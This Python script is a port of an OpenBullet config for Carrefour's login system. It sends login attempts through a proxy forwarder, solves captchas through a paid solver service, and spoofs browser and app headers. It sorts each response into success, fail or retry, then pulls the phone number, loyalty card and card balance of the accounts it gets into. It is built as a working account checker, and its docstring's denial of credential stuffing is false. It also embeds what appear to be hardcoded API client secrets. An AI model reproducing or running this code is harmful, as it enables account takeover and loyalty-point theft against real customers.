#!/usr/bin/env python3
"""
Python port of the OpenBullet / Node flow for Carrefour IAM (PKCE, forwarder,
ForgeRock authenticate, captcha solver, login JSON, OAuth code, tokens, API).

Required environment variables:
  POST_PROXY_URL       — proxy URL sent as postProxy to the local forwarder
  SOLVER_CLIENT_KEY    — solverify API client key
  CARREFOUR_USER       — email / username
  CARREFOUR_PASS       — password

Optional:
  LOCAL_FORWARDER_URL  — default http://127.0.0.1:5000
  OAUTH_AUTHORIZATION_BASIC — Base64 for Android token exchange
      (default matches the config snippet; override in production)
  CARREFOUR_API_CLIENT_ID / CARREFOUR_API_CLIENT_SECRET — apimx headers
  HTTPS_PROXY / HTTP_PROXY — if you need a global proxy for direct HTTPS calls

This file intentionally does not automate credential stuffing or bypass;
it is a faithful structural translation of the supplied blocks for integration
testing or migration off OpenBullet.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import json
import math
import os
import random
import re
import secrets
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from typing import Any

# --- Configuration ---

LOCAL_FORWARDER = os.environ.get("LOCAL_FORWARDER_URL", "http://127.0.0.1:5000")
PROXY_URL = os.environ.get("POST_PROXY_URL", "")
SOLVER_CLIENT_KEY = os.environ.get("SOLVER_CLIENT_KEY", "")

OAUTH_AUTHORIZATION_BASIC = os.environ.get(
    "OAUTH_AUTHORIZATION_BASIC",
    "Y2FycmVmb3VyX29uZWNhcnJlZm91cl9hbmRyb2lkOmU0N1pleDdXTg==",
)

CARREFOUR_API_CLIENT_ID = os.environ.get(
    "CARREFOUR_API_CLIENT_ID",
    "iHfpiidFSFr0iIcnyO5wRLPUSoVprtijxdS3AhRAk0vQOWqf",
)
CARREFOUR_API_CLIENT_SECRET = os.environ.get(
    "CARREFOUR_API_CLIENT_SECRET",
    "IfTK4HJCQEvic4z3fXSLzGti66Ex7R1DeBrfRtt2tr9horVRq33IB2Xsfch1pGec",
)

CODE_VERIFIER_ALPHABET = (
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"
)

AUTHENTICATE_POST_URL = (
    "https://moncompte.carrefour.fr/iam/json/authenticate?"
    "realm=/CarrefourConnect&goto=http%3A%2F%2Fmoncompte.carrefour.fr%2Fiam%2Foauth2%2F"
    "CarrefourConnect%2Fauthorize%3Fclient_id%3Dcarrefour_onecarrefour_web%26"
    "redirect_uri%3Dhttps%253A%252F%252Fwww.carrefour.fr%252Flogin%252Fcheck%26"
    "response_type%3Dcode%26scope%3Dopenid%2520iam%2520register-"
    "aHR0cHM6Ly93d3cuY2FycmVmb3VyLmZyL21vbi1jb21wdGUvaW5zY3JpcHRpb24%253D"
    "&realm=/CarrefourConnect"
)

ANDROID_CLIENT_ID = "carrefour_onecarrefour_android"
REDIRECT_URI_APP = "fr.carrefourconnect://redirect_uri"


def _maybe_decompress(headers: dict[str, str], body: bytes) -> bytes:
    enc = headers.get("content-encoding", "").lower()
    if "gzip" in enc and body:
        try:
            return gzip.decompress(body)
        except OSError:
            return body
    return body


def generate_code_verifier(length: int = 128) -> str:
    return "".join(
        secrets.choice(CODE_VERIFIER_ALPHABET) for _ in range(length)
    )


def base64_url_encode(raw: bytes) -> str:
    return (
        base64.b64encode(raw)
        .decode("ascii")
        .replace("+", "-")
        .replace("/", "_")
        .rstrip("=")
    )


def generate_code_challenge(code_verifier: str) -> str:
    digest = hashlib.sha256(code_verifier.encode("utf-8")).digest()
    return base64_url_encode(digest)


def _request(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    timeout: float = 120.0,
) -> tuple[int, dict[str, str], bytes]:
    req = urllib.request.Request(url, data=data, method=method.upper())
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.getcode() or 0
            hdrs = {k.lower(): v for k, v in resp.headers.items()}
            body = resp.read()
            body = _maybe_decompress(hdrs, body)
            return status, hdrs, body
    except urllib.error.HTTPError as e:
        hdrs = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        body = e.read() if e.fp else b""
        body = _maybe_decompress(hdrs, body)
        return e.code, hdrs, body


def forwarder_get(
    post_url: str,
    extra_headers: dict[str, str],
    *,
    post_url_header: str = "postUrl",
) -> tuple[int, dict[str, str], bytes]:
    h = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
        ),
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
        post_url_header: post_url,
        "postProxy": PROXY_URL,
        **extra_headers,
    }
    return _request(LOCAL_FORWARDER, method="GET", headers=h, data=b"")


def forwarder_post(
    post_url: str,
    extra_headers: dict[str, str],
    body: bytes = b"",
    *,
    post_url_header: str = "posturl",
) -> tuple[int, dict[str, str], bytes]:
    h = {
        post_url_header: post_url,
        "postProxy": PROXY_URL.rstrip("\n"),
        **extra_headers,
    }
    return _request(LOCAL_FORWARDER, method="POST", headers=h, data=body)


def header_location(headers: dict[str, str]) -> str | None:
    return headers.get("location")


def parse_lr(text: str, left: str, right: str) -> str | None:
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except ValueError:
        return None


def parse_json_token(text: str, key: str) -> Any:
    try:
        obj = json.loads(text)
    except json.JSONDecodeError:
        return None
    if isinstance(obj, dict) and key in obj:
        return obj[key]
    return None


def solver_create_task(client_key: str) -> dict[str, Any]:
    payload = {
        "clientKey": client_key,
        "task": {
            "type": "turnstile",
            "websiteURL": (
                "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize"
            ),
            "websiteKey": "0x4AAAAAAADaNvwE6lw9Qsdq",
            "cdata": "",
            "action": "LOGIN",
        },
    }
    body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    status, _, raw = _request(
        "https://solver.solverify.net/createTask",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
    )
    if status != 200:
        raise RuntimeError(f"createTask HTTP {status}: {raw[:500]!r}")
    return json.loads(raw.decode("utf-8", errors="replace"))


def solver_get_result(client_key: str, task_id: str) -> dict[str, Any]:
    payload = {"clientKey": client_key, "taskId": task_id}
    body = json.dumps(payload).encode("utf-8")
    status, _, raw = _request(
        "https://solver.solverify.net/getTaskResult",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
    )
    if status != 200:
        raise RuntimeError(f"getTaskResult HTTP {status}: {raw[:500]!r}")
    return json.loads(raw.decode("utf-8", errors="replace"))


def _reverse_hex_triplet(s: str) -> str:
    return s[::-1]


def _get_java_week_of_month(year: int, month_0_11: int, day: int) -> int:
    """Match JS: new Date(Date.UTC(year, month, 1))."""
    first = datetime(year, month_0_11 + 1, 1, tzinfo=timezone.utc)
    first_dow_js = (first.weekday() + 1) % 7  # JS: Sun=0
    first_dow_mon = (first_dow_js + 6) % 7
    days_in_first_week = 7 - first_dow_mon
    week1 = days_in_first_week >= 4
    if day <= days_in_first_week:
        return 1 if week1 else 0
    return (1 if week1 else 0) + math.ceil((day - days_in_first_week) / 7)


def _shuffle(lst: list[Any]) -> None:
    for i in range(len(lst) - 1, 0, -1):
        j = random.randint(0, i)
        lst[i], lst[j] = lst[j], lst[i]


def generate_carrefour_request_ids(
    x_session_id: str | None = None,
) -> tuple[str, str, str]:
    """
    Port of the Node block: xSessionId (UUID), xRequestId (hex string),
    xCorrelationId (8 hex from XOR + tail of random UUID).
    """
    if x_session_id:
        sid = x_session_id
    else:
        sid = str(uuid.uuid4())

    now = datetime.now(timezone.utc)
    utc_month = now.month - 1  # 0..11 like JS getUTCMonth
    utc_date = now.day
    utc_day_js = (now.weekday() + 1) % 7  # align with JS getUTCDay (Sun=0)
    utc_year = now.year
    java_day_of_week = 1 if utc_day_js == 0 else utc_day_js + 1
    week_of_month = _get_java_week_of_month(utc_year, utc_month, utc_date)

    month_value = (utc_month + 1) * 0x13C
    week_value = (week_of_month + 1) * 0x2A6
    day_value = ((java_day_of_week + 5) % 7 + 1) * 0x23C

    month_hex = f"{month_value:03x}"
    week_hex = f"{week_value:03x}"
    day_hex = f"{day_value:03x}"

    if random.random() < 0.5:
        month_hex = _reverse_hex_triplet(month_hex)
    if random.random() < 0.5:
        week_hex = _reverse_hex_triplet(week_hex)
    if random.random() < 0.5:
        day_hex = _reverse_hex_triplet(day_hex)

    u1 = str(uuid.uuid4()).replace("-", "")
    u2 = str(uuid.uuid4()).replace("-", "")
    combined = (u1 + u2).lower()

    length = len(combined)
    r1 = random.randint(0, max(0, length - 9))
    pos_a = random.randint(0, r1)
    pos_b = r1 + 3
    remaining = length - r1 - 8
    pos_c = random.randint(0, max(0, remaining - 1)) + r1 + 6

    positions = [pos_a, pos_b, pos_c]
    segments = [month_hex, week_hex, day_hex]
    _shuffle(positions)

    for i in range(3):
        p = positions[i]
        seg = segments[i]
        combined = combined[:p] + seg + combined[p + 3 :]

    x_request_id = combined.upper()

    xor_magic = 0x6B9E257C
    try:
        prefix = x_request_id[:8]
        parsed = int(prefix, 16)
        xored = (parsed ^ xor_magic) & 0xFFFFFFFF
        xored_hex = f"{xored:08x}"
        uuid_full = str(uuid.uuid4())
        uuid_tail = uuid_full[8:]
        x_correlation_id = (xored_hex + uuid_tail).upper()
    except (ValueError, IndexError):
        x_correlation_id = ""

    return sid, x_request_id, x_correlation_id


def classify_authenticate_response(source: str) -> str:
    """Map Keycheck blocks to a single label."""
    if "successUrl" in source:
        return "success"
    if "Domaine non valide" in source:
        return "retry"
    fails = (
        "Votre adresse ou mot de passe ne sont pas valides",
        "Compte suspendu",
        "was expecting comma to separate Object entries",
        "Changement de mot de passe",
        "Unrecognized character escape ",
    )
    if any(f in source for f in fails):
        return "fail"
    if "Aidez-nous à confirmer votre identité" in source:
        return "custom"
    return "unknown"


def build_login_json_body(
    auth_id: str,
    user: str,
    password: str,
    captcha_token: str,
) -> bytes:
    payload = {
        "authId": auth_id,
        "template": "",
        "stage": "CarrefourIAMLDAP1",
        "header": "Content de vous (re)voir !",
        "callbacks": [
            {
                "type": "NameCallback",
                "output": [{"name": "prompt", "value": "Adresse électronique"}],
                "input": [{"name": "IDToken1", "value": user}],
            },
            {
                "type": "PasswordCallback",
                "output": [{"name": "prompt", "value": "Mot de passe"}],
                "input": [{"name": "IDToken2", "value": password}],
            },
            {
                "type": "CaptchaCallback",
                "output": [
                    {"name": "version", "value": "V2(Invisible)"},
                    {"name": "prompt", "value": "0x4AAAAAAADaNvwE6lw9Qsdq"},
                ],
                "input": [{"name": "IDToken3", "value": captcha_token}],
            },
        ],
    }
    return json.dumps(payload, ensure_ascii=False).encode("utf-8")


def parse_regex_one(text: str, pattern: str) -> str | None:
    m = re.search(pattern, text)
    return m.group(1) if m else None


def run_full_flow() -> dict[str, Any]:
    user = os.environ.get("CARREFOUR_USER", "").strip()
    password = os.environ.get("CARREFOUR_PASS", "").strip()
    if not PROXY_URL.strip():
        raise RuntimeError(
            "Set POST_PROXY_URL (proxy URL for the forwarder's postProxy header)."
        )
    if not SOLVER_CLIENT_KEY.strip():
        raise RuntimeError("Set SOLVER_CLIENT_KEY.")
    if not user or not password:
        raise RuntimeError("Set CARREFOUR_USER and CARREFOUR_PASS.")

    code_verifier = generate_code_verifier()
    code_challenge = generate_code_challenge(code_verifier)

    authorize_qs = urllib.parse.urlencode(
        {
            "response_type": "code",
            "client_id": "carrefour_onecarrefour_ios",
            "scope": "openid iam",
            "redirect_uri": REDIRECT_URI_APP,
            "code_challenge": code_challenge,
            "code_challenge_method": "S256",
        },
        safe="",
    )
    post_url_1 = (
        "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        + authorize_qs.replace("+", "%20")
    )

    _, h1, _ = forwarder_get(post_url_1, {})
    location1 = header_location(h1)
    if not location1:
        raise RuntimeError("Step 1: missing Location header")

    _, h2, _ = forwarder_get(
        location1,
        {
            "Connection": "close",
            "Host": "moncompte.carrefour.fr",
            "Referer": "https://www.carrefour.fr/",
            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
            "sec-ch-ua-mobile": "?0",
            'sec-ch-ua-platform': '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
        },
    )
    loc2 = header_location(h2)
    if not loc2:
        raise RuntimeError("Step 2: missing Location header")

    step3_target = (
        loc2 if loc2.startswith("http") else "https://moncompte.carrefour.fr" + loc2
    )
    forwarder_get(
        step3_target,
        {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
            ),
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.8",
        },
        post_url_header="posturl",
    )

    goto_params = {
        "client_id": "carrefour_onecarrefour_ios",
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "redirect_uri": REDIRECT_URI_APP,
        "response_type": "code",
        "scope": "openid iam",
    }
    goto_path = (
        "http://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        + urllib.parse.urlencode(goto_params).replace("+", "%20")
    )
    goto_full = urllib.parse.quote(goto_path, safe="")
    auth_url = (
        "https://moncompte.carrefour.fr/iam/json/authenticate?"
        f"goto={goto_full}&realm=/CarrefourConnect"
    )

    auth_headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        ),
        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
        "X-NoSession": "true",
        "X-Username": "anonymous",
        "Origin": "https://moncompte.carrefour.fr/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Connection": "keep-alive",
        "X-Password": "anonymous",
        "Accept-Language": "fr-FR",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-API-Version": "protocol=1.0,resource=2.0",
        "Sec-Fetch-Mode": "cors",
    }
    _, _, auth_body = forwarder_post(auth_url, auth_headers, body=b"")

    source = auth_body.decode("utf-8", errors="replace")
    auth_id = parse_lr(source, 'authId":"', '"') or parse_json_token(source, "authId")
    if not auth_id:
        raise RuntimeError("Could not parse authId from first authenticate response.")

    task = solver_create_task(SOLVER_CLIENT_KEY)
    task_dump = json.dumps(task, separators=(",", ":"))
    if task.get("errorId") != 0 and '{"errorId":0,' not in task_dump:
        raise RuntimeError(f"Solver createTask error: {task}")

    task_id = task.get("taskId")
    if not task_id:
        raise RuntimeError("Missing taskId from solver")

    token44 = None
    for _ in range(60):
        result = solver_get_result(SOLVER_CLIENT_KEY, str(task_id))
        if result.get("status") == "ready":
            token44 = result.get("value")
            if not token44 and isinstance(result.get("solution"), dict):
                sol = result["solution"]
                token44 = sol.get("token") or sol.get("value")
            if token44:
                break
        time.sleep(2)
    if not token44:
        raise RuntimeError("Captcha solver did not return a token in time.")

    login_body = build_login_json_body(str(auth_id), user, password, str(token44))
    login_headers = {
        "Host": "moncompte.carrefour.fr",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "User-Agent": (
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        ),
        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
        "X-NoSession": "true",
        "X-Username": "anonymous",
        "Origin": "https://moncompte.carrefour.fr",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Connection": "keep-alive",
        "X-Password": "anonymous",
        "Accept-Language": "fr-FR",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-API-Version": "protocol=1.0,resource=2.0",
        "Sec-Fetch-Mode": "cors",
    }
    _, _, login_resp = forwarder_post(
        AUTHENTICATE_POST_URL, login_headers, body=login_body, post_url_header="posturl"
    )
    login_text = login_resp.decode("utf-8", errors="replace")
    auth_class = classify_authenticate_response(login_text)
    if auth_class != "success":
        return {
            "authenticate_outcome": auth_class,
            "authenticate_body_preview": login_text[:2000],
            "code_challenge": code_challenge,
        }

    nonce = secrets.token_urlsafe(16).rstrip("=")[:22]
    state = secrets.token_urlsafe(16).rstrip("=")[:22]
    android_authorize = (
        "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        + urllib.parse.urlencode(
            {
                "client_id": ANDROID_CLIENT_ID,
                "code_challenge": code_challenge,
                "code_challenge_method": "S256",
                "nonce": nonce,
                "prompt": "",
                "redirect_uri": REDIRECT_URI_APP,
                "response_type": "code",
                "scope": "openid iam",
                "state": state,
            }
        )
    )

    chrome_android_headers = {
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        ),
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Host": "moncompte.carrefour.fr",
        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": (
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
    }
    _, loc_h, _ = _request(android_authorize, method="GET", headers=chrome_android_headers)
    loc_final = header_location(loc_h) or ""
    code = parse_lr(loc_final, "?code=", "&")
    if not code:
        code = parse_lr(loc_final, "code=", "&")
    if not code:
        raise RuntimeError(
            f"Could not parse authorization code from Location: {loc_final[:500]!r}"
        )

    token_form = urllib.parse.urlencode(
        {
            "code": code,
            "redirect_uri": REDIRECT_URI_APP,
            "grant_type": "authorization_code",
            "code_verifier": code_verifier,
        }
    ).encode("utf-8")

    token_headers = {
        "Accept-Encoding": "gzip",
        "authorization": f"Basic {OAUTH_AUTHORIZATION_BASIC}",
        "Connection": "Keep-Alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "moncompte.carrefour.fr",
        "user-agent": (
            "Carrefour/22.6.0 Dalvik/2.1.0 (Linux; U; Android 9; SM-S9280 "
            "Build/PQ3B.190801.11070909)"
        ),
        "X-Correlation-Id": str(uuid.uuid4()).upper(),
        "X-Request-Id": secrets.token_hex(32).upper(),
        "x-session-id": str(uuid.uuid4()),
    }
    token_url = (
        "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/access_token"
        "?q=loginbycode"
    )
    _, _, token_raw = _request(
        token_url, method="POST", headers=token_headers, data=token_form
    )
    token_json_text = token_raw.decode("utf-8", errors="replace")
    id_token = parse_json_token(token_json_text, "id_token")
    access_token = parse_json_token(token_json_text, "access_token")

    x_session_id, x_request_id, x_correlation_id = generate_carrefour_request_ids()

    api_ua = token_headers["user-agent"]
    me_headers = {
        "Accept": "application/json",
        "Accept-Encoding": "gzip",
        "access-token": str(access_token),
        "authorization": f"Bearer {id_token}",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json",
        "Host": "app.apimx.carrefour.fr",
        "User-Agent": api_ua,
        "x-carrefour-client-id": CARREFOUR_API_CLIENT_ID,
        "x-carrefour-client-secret": CARREFOUR_API_CLIENT_SECRET,
        "x-correlation-id": x_correlation_id,
        "x-request-id": x_request_id,
        "X-Session-Id": x_session_id,
    }
    me_url = (
        "https://app.apimx.carrefour.fr/retail/v1/customers-management/customers/me"
        "?full=false&fetch_kpis=true"
    )
    _, _, me_body = _request(me_url, method="GET", headers=me_headers)
    me_text = me_body.decode("utf-8", errors="replace")

    phone = parse_regex_one(me_text, r'"phones":\[\{"num":"(\d+)"')
    carte = parse_regex_one(me_text, r'"cards":\[\{"num":"(\d+)"')
    linked_raw = parse_lr(me_text, '"linked":', "}")
    linked_flag = (linked_raw or "").strip()

    _, x_request_id2, x_correlation_id2 = generate_carrefour_request_ids(x_session_id)

    balance_headers = {
        **me_headers,
        "x-request-id": x_request_id2,
        "x-correlation-id": x_correlation_id2,
        "loyalty-card-id": str(carte or ""),
    }
    bal_url = (
        "https://app.apimx.carrefour.fr/retail/v1/customers-management/"
        "customers/me/loyalty_card/balance"
    )
    _, _, bal_body = _request(bal_url, method="GET", headers=balance_headers)
    bal_text = bal_body.decode("utf-8", errors="replace")

    rate_limited = "The number of attempts is reached" in bal_text
    solde: float | None = None
    try:
        bal_obj = json.loads(bal_text)
        if isinstance(bal_obj, dict) and "balance" in bal_obj:
            solde = float(bal_obj["balance"])
    except (json.JSONDecodeError, TypeError, ValueError):
        parsed = parse_lr(bal_text, '{"balance":', "}}")
        if parsed is not None:
            try:
                solde = float(parsed.strip().rstrip("}").split(",")[0])
            except ValueError:
                solde = None

    low_balance = solde is not None and solde < 10

    return {
        "authenticate_outcome": auth_class,
        "code_challenge": code_challenge,
        "authorization_code": code,
        "id_token": id_token,
        "access_token": access_token,
        "x_session_id": x_session_id,
        "x_request_id": x_request_id,
        "x_correlation_id": x_correlation_id,
        "phone": phone,
        "carte": carte,
        "linked": linked_flag,
        "linked_empty_or_zero": linked_flag in ("", "0"),
        "balance_raw_preview": bal_text[:500],
        "rate_limited": rate_limited,
        "solde": solde,
        "low_balance_under_10": low_balance,
    }


if __name__ == "__main__":
    out = run_full_flow()
    print(json.dumps(out, indent=2, ensure_ascii=False))
